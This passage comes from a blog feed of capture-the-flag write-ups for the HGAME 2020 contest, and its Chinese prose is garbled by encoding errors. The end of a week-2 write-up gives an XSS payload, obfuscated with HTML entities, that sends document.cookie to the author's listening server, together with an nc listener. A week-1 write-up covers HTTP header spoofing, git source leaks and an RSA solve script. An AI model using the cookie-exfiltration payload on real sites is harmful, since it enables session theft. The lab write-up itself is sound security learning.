class="code"><pre><span class="line"><span class="built_in">window</span>.location.href=<span class="string">"vpsip:port/?s="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ˜ç™½äº†è·å–cookieçš„payloadæ ¼å¼ã€‚é‚£ä¹ˆå¯¹æ­¤é¢˜ï¼Œæˆ‘ä»¬çš„ç†æƒ³payloadå°±æ˜¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"window.location.href="</span>ip:<span class="number">7788</span>/?s=<span class="string">"+document.cookie;"</span>&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å‡ºäºéšç§æŠŠè‡ªå·±çš„ipæ»¤æ‰ï¼Œåªæ˜¾ç¤ºæˆ‘ç›‘å¬çš„æ˜¯7788ç«¯å£ã€‚</p><p>é‚£ä¹ˆç¼–ç ï¼Œå»å°–æ‹¬å·åï¼Œæˆ‘ä»¬å®é™…æäº¤çš„payloadä¸ºï¼š(è¿™é‡Œæˆ‘æŠŠipæ¢æˆ127.0.0.1)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x37;&amp;#x38;&amp;#x38;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;"</span></span><br></pre></td></tr></table></figure><p>åœ¨é¢˜ç›®ç•Œé¢æäº¤åæˆ‘ä»¬çœ‹çœ‹æœ‰æ²¡æœ‰æˆåŠŸæ’å…¥<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/14.jpg" class="lazyload" data-srcset="14.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="message payload"><br>å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶å›æ˜¾æ˜¾ç¤ºçš„ä¸€ä¸ªæ— å†…å®¹çš„æ–¹æ¡†ã€‚ä½†æˆ‘çš„payloadè¢«æˆåŠŸè§£æã€‚<br>åŒæ—¶åœ¨vpsä¸Šç›‘å¬ç«¯å£7788</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7788</span><br></pre></td></tr></table></figure><p>æäº¤è„šæœ¬è·‘å‡ºæ¥çš„codeï¼Œæ”¶åˆ°Successçš„åŒæ—¶æŸ¥çœ‹æœåŠ¡å™¨<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/15.jpg" class="lazyload" data-srcset="15.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="token"><br>æˆåŠŸå¸¦å‡ºtokenã€‚é‚£ä¹ˆç”¨bpæ¢tokenè®¿é—®/flagå§ã€‚<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/16.jpg" class="lazyload" data-srcset="16.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><p>è¿™é“é¢˜çœŸçš„èŠ±äº†å¾ˆä¹…ã€‚æ¯•ç«Ÿè‡ªå·±åœ¨æ­¤ä¹‹å‰æ²¡æ¥è§¦è¿‡ä¸€é“xssæ‰“cookieçš„çœŸé¢˜ã€‚ä½†æ˜¯è¿˜æ˜¯é ç€ç½‘ä¸ŠçŸ¥è¯†å­¦åˆ°äº†è®¸å¤šï¼ŒæˆåŠŸæ‹¿åˆ°è‡ªå·±çš„flagã€‚æ‰€ä»¥è¦å¤šå¤šå‘å„ä½dalaoä»¥åŠç™¾åº¦è°·æ­Œå­¦ä¹ å•Šã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­ç”µhgame-week1</title>
      <link href="2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/"/>
      <url>2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/</url>
      
        <content type="html"><![CDATA[<p>   èŒæ–°çš„ç¬¬ä¸€æ¬¡hgameå¼€å§‹äº†ã€‚week1çš„éš¾åº¦æ¯”è¾ƒå‹å¥½ï¼Œè‡³å°‘ä»webä¸Šæ¥è¯´æ˜¯è¿™æ ·çš„ï¼Œè‡ªå·±ç›®æ ‡ä¹Ÿä¸é«˜ï¼Œäº‰å–åšåˆ°æ¯ä¸ªweekèƒ½akwebå°±æ»¡è¶³äº†ã€‚è¿™æ¬¡çš„webæ•´ä½“ä¸Šæ¯”è¾ƒç®€å•ï¼Œé™¤äº†æˆ‘è‡ªå·±è¢«å‘åˆ°çš„codeworldï¼ˆä¸­é—´å±…ç„¶è¢«banäº†ip,æˆ‘åªæ˜¯ç”¨è„šæœ¬postäº†ä¸€æ¬¡ ï¼Œæ²¡æ‹¿æ‰«æå™¨æ‰«å•Šå•Šå•Šï¼‰å‰©ä¸‹çš„3é¢˜åŠ èµ·æ¥åŸºæœ¬1å°æ—¶ä»¥å†…å°±èƒ½åšå®Œhhã€‚é™¤æ­¤ä¹‹å¤–è¿˜è¯•äº†è¯•å¯†ç å­¦è·Ÿmiscçš„ç®€å•é¢˜ï¼Œä¹Ÿéƒ½å†™ä¸€å†™è¿‡ç¨‹å§ã€‚ï¼ˆå¦å¤–ä½“ä¼šåˆ°re,pwnçœŸçš„æ˜¯çˆ¸çˆ¸ï¼Œçˆ·çˆ·ï¼Œæ’åé«˜çš„åŸºæœ¬éƒ½æ˜¯äºŒè¿›åˆ¶çš„â€¦â€¦,æˆ‘ä»€ä¹ˆæ—¶å€™æ‰èƒ½å­¦ä¼šäºŒè¿›åˆ¶å•Šï¼‰</p><p>çœ‹åˆ°å®˜æ–¹å‘å¸ƒäº†æ‰å‘çš„ï¼Œé‚£å°±è´´ä¸‹å®˜æ–¹çš„ï¼š<a href="https://github.com/vidar-team/Hgame2020_writeup" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2020_writeup</a></p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h2><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git"><br>æ˜¾ç„¶æç¤ºçš„æ˜¯æºç æ³„éœ²ã€‚é‚£ä¹ˆå°±æœæ–­GitHackèµ°èµ·ã€‚å¯æ˜¯æ‹¿ä¸‹æ¥çš„ç»“æœåªæœ‰index.htmlä¸cssæ–‡ä»¶ã€‚è¿™æ—¶å€™ä¸€å¼€å§‹æˆ‘é™·å…¥äº†é”™è¯¯çš„æƒ³æ³•ï¼Œå…·ä½“å‚è€ƒåŸæ¥ichunqiuä¸Šåšè¿‡çš„â€˜ç™»é™†â€™ä¸€é¢˜ã€‚äºæ˜¯æˆ‘ä½¿ç”¨äº†èƒ½å¤Ÿå›æ»šçš„githackï¼Œåœ¨å®ƒçˆ¬ä¸‹çš„objectsé‡Œä¸€ä¸ªä¸ªæ‰¾ï¼ˆå…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git  cat-file -p &#x2F;ä¸¤ä½æ•°&#x2F;æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å®Œæ‰€æœ‰objectsä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ”¶è·ï¼Œé™¤äº†å‡ºé¢˜äººçš„githubâ€¦â€¦é‚£ä¹ˆæ˜¯å¦æ˜¯å†å²å›æ»šå‘¢ï¼Ÿä½†ç”¨gitæ‰¾å´åªæ‰¾åˆ°ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ„Ÿè§‰ä¸å¤ªå¯¹åŠ²ã€‚é‚£å°±ä¸Šgithubä¸Šæ‰¾æ‰¾å§â€¦â€¦ç»“æœè¿˜çœŸæœ‰ã€‚<img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="commit"><br>ä¸‹é¢çš„ç‰ˆæœ¬ä¸­å°±æœ‰flagçš„base64ç¼–ç </p><h2 id="æ¥å¤´éœ¸ç‹"><a href="#æ¥å¤´éœ¸ç‹" class="headerlink" title="æ¥å¤´éœ¸ç‹"></a>æ¥å¤´éœ¸ç‹</h2><p>é¢˜ç›®ä¸Šæ¥æ²¡å•¥æç¤ºï¼Œé™¤äº†ä¸€å¼ æ¥å¤´éœ¸ç‹çš„å›¾ç‰‡è·Ÿyou need to come from vidar.club<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å¤´"></p><p>è¦è¯´webé‡Œè·Ÿå¤´æœ‰å…³çš„ï¼Œé‚£åªèƒ½æ˜¯æŠ“åŒ…é‡Œå¸¸è§çš„Headeräº†ã€‚åŠ ä¸Šcome from æŸä¸ªç½‘å€ï¼Œä¸éš¾çŸ¥é“å°±æ˜¯http Headerä¸­refererè¿™ä¸ªå±æ€§ã€‚è¿™ä¸ªå±æ€§ä¹‹æ‰€ä»¥æœ‰åï¼Œè·Ÿå®ƒå°†é”™å°±é”™çš„æ‹¼å†™æœ‰å…³ï¼Œæ­£ç¡®æ‹¼å†™æ˜¾ç„¶æ˜¯referrer,è€Œè¿™ä¸ªé”™è¯¯æ‹¼å†™æ˜¯æ—©æœŸè§„èŒƒçš„é”™è¯¯å› ä¸ºå‘åå…¼å®¹é—ç•™è‡³ä»Šçš„ã€‚å…¶ä½œç”¨æ˜¯å‘Šè¯‰æœåŠ¡å™¨æˆ‘ä»¬è®¿é—®è€…æ˜¯ä»å“ªé“¾æ¥è¿‡æ¥çš„ï¼Œä»è€Œè¿›è¡ŒåŒºåˆ«å¤„ç†ã€‚<br>é‚£ä¹ˆå…ˆåŠ refererå¤´<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="referer"></p><p>æç¤ºè¦ä»æœ¬åœ°è®¿é—®ï¼Œé‚£å°±æ›´ç†Ÿæ‚‰ä¸è¿‡äº†ï¼Œå› ä¸ºè¿™ç”¨åˆ°å·²ç»çƒ‚ç†Ÿäºå¿ƒçš„XFFå¤´äº†ã€‚å¸¸å¸¸ç”¨äºä¼ªé€ ipã€‚æ‰€ä»¥æˆ‘ä»¬ä»¤XFFå¤´ä¸º127.0.0.1.<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/5.jpg" class="lazyload" data-srcset="5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="xff"><br>æç¤ºæ”¹æµè§ˆå™¨ï¼Œé‚£åªéœ€æ”¹User-Agent å¤´ï¼ŒåŠ ä¸Šcosmoså³å¯ã€‚<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/6.jpg" class="lazyload" data-srcset="6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="user-agent"><br>flagè¦åœ¨2077åæ›´æ–°ï¼Ÿä¸€çœ‹åˆ°2077æˆ‘å°±æƒ³åˆ°å»å¹´æ–°æ‰‹ä¸Šåœºçš„ä¸­ç§‘å¤§hackergameé‡Œçš„ä¿¡æ¯å®‰å…¨2077ï¼Œé‚£é“é¢˜å°±æ˜¯é€šè¿‡æ”¹headerä¸­ä¸€ä¸ªå±æ€§æ¥æ‹¿flagã€‚è¿™é“é¢˜åº”è¯¥ä¹Ÿä¸€æ ·å§â€¦â€¦é‚£ä¹ˆæˆ‘ä»¬è¦æ”¹ä»€ä¹ˆå±æ€§å‘¢ï¼Ÿå…ˆæ¥çœ‹çœ‹response:<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/7.jpg" class="lazyload" data-srcset="7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Last-Modified"><br>æ³¨æ„åˆ°æœ‰Last-Moifiedè¿™ä¸€å±æ€§ï¼Œè€Œrequestsçš„è¯·æ±‚å¤´ä¸­ä¸ä¹‹å¯¹åº”çš„å°±æ˜¯If-Unmodifed-Since,å…¶å®˜æ–¹è§£é‡Š</p><blockquote><p>HTTPåè®®ä¸­çš„ <strong><code>If-Unmodified-Since</code></strong> æ¶ˆæ¯å¤´ç”¨äºè¯·æ±‚ä¹‹ä¸­ï¼Œä½¿å¾—å½“å‰è¯·æ±‚æˆä¸ºæ¡ä»¶å¼è¯·æ±‚ï¼šåªæœ‰å½“èµ„æºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åæ²¡æœ‰è¿›è¡Œè¿‡ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨æ‰ä¼šè¿”å›è¯·æ±‚çš„èµ„æºï¼Œæˆ–æ˜¯æ¥å— <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener" title="HTTP POST æ–¹æ³• å‘é€æ•°æ®ç»™æœåŠ¡å™¨. è¯·æ±‚ä¸»ä½“çš„ç±»å‹ç”± Content-Type é¦–éƒ¨æŒ‡å®š."><code>POST</code></a> æˆ–å…¶ä»– non-<a href="https://developer.mozilla.org/en-US/docs/Glossary/safe" target="_blank" rel="noopener" title="safe: An HTTP method is safe if it doesn&#39;t alter the state of the server. In other words, a method is safe if it leads to a read-only operation. Several common HTTP methods are safe: GET, HEAD, or OPTIONS. All safe methods are also idempotent, but not all idempotent methods are safe. For example, PUT and DELETE are both idempotent but unsafe.">safe</a> æ–¹æ³•çš„è¯·æ±‚ã€‚å¦‚æœæ‰€è¯·æ±‚çš„èµ„æºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åå‘ç”Ÿäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆä¼šè¿”å› <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412" target="_blank" rel="noopener" title="åœ¨ HTTP åè®®ä¸­ï¼Œå“åº”çŠ¶æ€ç  412 Precondition Failedï¼ˆå…ˆå†³æ¡ä»¶å¤±è´¥ï¼‰è¡¨ç¤ºå®¢æˆ·ç«¯é”™è¯¯ï¼Œæ„å‘³ç€å¯¹äºç›®æ ‡èµ„æºçš„è®¿é—®è¯·æ±‚è¢«æ‹’ç»ã€‚è¿™é€šå¸¸å‘ç”Ÿäºé‡‡ç”¨é™¤ GET å’Œ HEAD ä¹‹å¤–çš„æ–¹æ³•è¿›è¡Œæ¡ä»¶è¯·æ±‚æ—¶ï¼Œç”±é¦–éƒ¨å­—æ®µ If-Unmodified-Since æˆ– If-None-Match è§„å®šçš„å…ˆå†³æ¡ä»¶ä¸æˆç«‹çš„æƒ…å†µä¸‹ã€‚è¿™æ—¶å€™ï¼Œè¯·æ±‚çš„æ“ä½œâ€”â€”é€šå¸¸æ˜¯ä¸Šä¼ æˆ–ä¿®æ”¹æ–‡ä»¶â€”â€”æ— æ³•æ‰§è¡Œï¼Œä»è€Œè¿”å›è¯¥é”™è¯¯çŠ¶æ€ç ã€‚"><code>412</code></a> (Precondition Failed) é”™è¯¯ã€‚</p></blockquote><p>æ‰€ä»¥æ”¹å¥½æ—¶é—´åœ¨2077ä¹‹åï¼š<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/8.jpg" class="lazyload" data-srcset="8.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="If-Unmodified-Since"></p><h2 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h2><p>  è¿™é“é¢˜åšå‡ºæ¥çš„äººæ•°ç®—æ˜¯æ‰€æœ‰webé‡Œé¢æœ€å°‘çš„äº†,ä½†æ˜¯è‡ªå·±ä¸€å¼€å§‹å‚»å‚»çš„å¡äº†å¥½ä¹…â€¦â€¦<br>  å¼€å§‹ä¸€ä¸ª403,ä¸è¿‡ä½œä¸ºctfer,åƒä¸‡ä¸è¦ç›¸ä¿¡è¿™ä¸ª403æ˜¯çœŸæ­£çš„403ï¼Œé‚£ä¹ˆå…ˆæŠ“ä¸ªåŒ…ï¼Œæœä¸å…¶ç„¶<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/9.jpg" class="lazyload" data-srcset="9.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="302"><br>æç¤ºå­˜åœ¨302ï¼Œé‚£ä¹ˆç›´æ¥è®¿é—®index.phpå§ï¼ŒæŠ“åŒ…åå‘è‡³repeaterå‘ç°å­˜åœ¨405,é‚£ä¹ˆæœæ–­æ”¹æˆPOSTè¯·æ±‚æ–¹å¼ï¼Œå¾—åˆ°ï¼š<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/10.jpg" class="lazyload" data-srcset="10.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="äººæœºéªŒè¯"></p><p>é‚£ä¹ˆæç¤ºé€šè¿‡urlä¼ å€¼ï¼Œé‚£æœæ–­ä¼ <code>/?a=5+5</code>å•Šï¼Œç»“æœè¿”å›è¯´â€œå†æƒ³æƒ³â€ã€‚è‡ªå·±é¡¿æ—¶é™·å…¥è¿·èŒ«ï¼Œä¸€å¼€å§‹æƒ³æ˜¯ä¸æ˜¯ä¸æ˜¯ç”¨+è¿æ¥ï¼Œåæ¥åˆæƒ³ï¼ŒåŸºäºé¢˜ç›®æ˜¯codeworldï¼Œæ˜¯ä¸æ˜¯è¦ä»£ç æ‰§è¡Œ?ä½†æ˜¯fuzzäº†ä¸€ä¸‹ï¼Œå‘ç°å¹¶æ²¡æœ‰å›æ˜¾æ‰§è¡Œçš„ç‚¹ã€‚äºæ˜¯é™·å…¥è¿·èŒ«ã€‚åæ¥ï¼Œè‡ªå·±åœ¨æ£€æŸ¥è‡ªå·±æŠ“çš„åŒ…æ—¶ï¼Œæ„å¤–å‘ç°äº†ä¸€ç‚¹ï¼š<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/11.jpg" class="lazyload" data-srcset="11.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="getä¼ å€¼"><br>å¯¹äº†ï¼åœ¨è¿›è¡Œgetä¼ å€¼æ—¶ï¼Œä»–ä¼šæŠŠåŠ å·å¤„ç†æˆç©ºã€‚ä¹Ÿæ­£å› å¦‚æ­¤ï¼Œé¢˜ç›®æ‰ä¼šè¦æ±‚urlä¼ å€¼å¹¶ä½¿ç”¨ç›¸åŠ è¿™ç§æ–¹å¼æ¥è®¾ç½®é™å®šã€‚æ‰€ä»¥payloadå³ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?a&#x3D;5%2B5</span><br></pre></td></tr></table></figure><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/12.jpg" class="lazyload" data-srcset="12.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h2 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h2><p>æ¸¸æˆé¢˜hhhä½†ä»æ¸¸æˆè§’åº¦è¿‡åˆ†éš¾äº†ã€‚æ˜¾ç„¶æ¸¸æˆåªæ˜¯å¹Œå­ï¼Œåº”è¯¥æ‰¾åˆ°ç½‘ç«™é‡Œèƒ½postå€¼çš„æ“ä½œï¼Œäºæ˜¯å°è¯•ç‹‚ç‚¹â€˜å¼€å§‹æ¸¸æˆâ€™ï¼Œæœç„¶æç¤ºéœ€è¦300000åˆ†æ—¶æŠ“åˆ°poståŒ…ã€‚æ”¹åŒ…å°±å¥½ã€‚<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/13.jpg" class="lazyload" data-srcset="13.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h2><p>æœ‰ç”Ÿä¹‹å¹´è¿˜èƒ½åšå‡ºRSAâ€¦â€¦å› ä¸ºçœ‹åˆ°RSAå‡ ä¸ªå‚æ•°æç¤ºçš„å¾ˆæ¸…æ¥šå°±å¹²è„†å»ç½‘ä¸Šå«–è„šæœ¬äº†ã€‚åœ¨è£…åº“çš„æ—¶å€™å°±å¾ˆæ— å¥ˆï¼Œgmpy2æ€»æ˜¯å¼„ä¸å¥½ã€‚æœ€åå»æ‰¾äº†ä¸ªwhlï¼Œpip installä¸‹æ€»å½’èƒ½ç”¨äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = gmpy2.mpz(<span class="number">681782737450022065655472455411</span>)</span><br><span class="line">q = gmpy2.mpz(<span class="number">675274897132088253519831953441</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">13</span>)</span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">c = gmpy2.mpz(<span class="number">275698465082361070145173688411496311542172902608559859019841</span>)</span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line">print(<span class="string">"åè¿›åˆ¶:\n%s"</span>%m)</span><br><span class="line">m_hex = hex(m)[<span class="number">2</span>:]</span><br><span class="line">print(<span class="string">"åå…­è¿›åˆ¶:\n%s"</span>%(m_hex,))</span><br><span class="line"><span class="comment">#print("ascII:\n%s"%((binascii.b2a_hex(hex(m)[2:])).decode('hex'),))</span></span><br><span class="line">print(<span class="string">"ascii:\n%s"</span>%(binascii.a2b_hex(m_hex).decode(<span class="string">"utf8"</span>),))</span><br></pre></td></tr></table></figure><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/14.jpg" class="lazyload" data-srcset="14.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="RSA"></p><h1 